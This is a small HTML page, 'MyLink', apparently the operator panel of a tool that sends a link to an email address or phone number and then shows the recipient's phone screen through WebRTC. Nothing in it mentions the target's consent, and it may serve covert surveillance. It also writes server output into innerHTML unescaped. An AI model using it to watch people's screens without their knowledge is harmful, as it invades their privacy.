<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>MyLink</title>
  <style>
    body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:20px}
    input,button{width:90%;padding:15px;margin:10px;font-size:18px;border:none;border-radius:8px}
    input{background:#222;color:#0f0}
    button{background:#0f0;color:#000;font-weight:bold}
    #s{margin:20px;font-size:20px}
    video{width:100%;max-width:600px;border:3px solid #0f0;border-radius:10px;background:#000}
  </style>
</head>
<body>
  <h1>MyLink</h1>
  <input id="t" placeholder="email or +254712345678">
  <button onclick="go()">SEND LINK</button>
  <div id="s"></div>
  <h2>Phone Screen</h2>
  <video id="v" autoplay playsinline></video>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const v = document.getElementById('v');

    socket.on('offer', async o => {
      const pc = new RTCPeerConnection();
      pc.setRemoteDescription(o);
      const a = await pc.createAnswer();
      await pc.setLocalDescription(a);
      socket.emit('answer', a);
      pc.ontrack = e => v.srcObject = e.streams[0];
    });

    async function go() {
      const target = document.getElementById('t').value.trim();
      if (!target) return s("Enter email or phone");
      s("Sending...");
      const r = await fetch("/send?target=" + encodeURIComponent(target));
      document.getElementById('s').innerHTML = await r.text();
    }
    function s(m) { document.getElementById('s').innerHTML = "<p>" + m + "</p>"; }
  </script>
</body>
</html>
